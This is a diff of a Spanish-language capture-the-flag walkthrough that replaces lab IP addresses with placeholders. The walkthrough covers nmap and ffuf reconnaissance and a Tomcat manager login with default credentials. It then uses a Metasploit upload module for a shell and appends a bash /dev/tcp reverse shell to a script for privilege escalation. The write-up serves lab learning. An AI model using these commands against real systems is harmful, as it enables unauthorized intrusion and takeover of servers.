@@ -41,31 +41,31 @@ Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas w
 ### Nmap
 Veremos que redes estan conectadas a esta subred con este comando:
 
-```nmap -sP 192.168.221.0/24```
+```nmap -sP X.X.X.0/24```
 
 Para ver los puertos abiertos que tiene la red utilizaremos este comando:
 
-```nmap -sV -sC 192.168.221.9```
+```nmap -sV -sC X.X.X.9```
 
 ### Fuzz / Whatweb
 Para fuzzear la web usaremos este comando con una wordlist que tengamos:
 
-```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.9/FUZZ```
+```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://X.X.X.9/FUZZ```
 
 Para ver solo archivos con extensión .txt,.php,.html
 
 ```
-ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.221.9/FUZZ -e .txt,.html,.php -ic
+ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://X.X.X.9/FUZZ -e .txt,.html,.php -ic
 ```
 
 Con este comando podemos recolectar información de un servidor web:
-```whatweb http://192.168.221.9```
+```whatweb http://X.X.X.9```
 
 ## Búsqueda de vulnerabilidades
 
 ### Tomcat
 
-El login del tomcat lo hemos encontrado en esta url: ```http://192.168.221.9:8080/manager```
+El login del tomcat lo hemos encontrado en esta url: ```http://X.X.X.9:8080/manager```
 
 En esta [página web ](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown) encontramos las credenciales por defecto.
 
@@ -83,11 +83,11 @@ Para obtener un reverse shell buscaremos en el metasploit la version del tomcat 
 Dentro del metasploit escribiremos esto:
 ```
 use multi/http/tomcat_mgr_upload
-set lhost 192.168.221.4
+set lhost X.X.X.4
 set rport 8080
 set HttpPassword tomcat
 set HttpUsername tomcat
-set rhosts 192.168.221.9
+set rhosts X.X.X.9
 exploit
 ```
 Con esto obtendremos control del usuario **www-data**
@@ -169,7 +169,7 @@ En este caso encontraremos otra dirección que es esta: ```/home/vishal/office/m
 
 Leeremos el archivo viendo que esta en bash y le añadiremos una reverse shell para ver si podemos escalar privilegios.
 
-Usaremos este reverse shell: ```bash -i >& /dev/tcp/192.168.221.4/4444 0>&1```
+Usaremos este reverse shell: ```bash -i >& /dev/tcp/X.X.X.4/4444 0>&1```
 
 Y obviamente podremos un puerto en escucha: ```rlwrap nc -nvlp 4444```
 
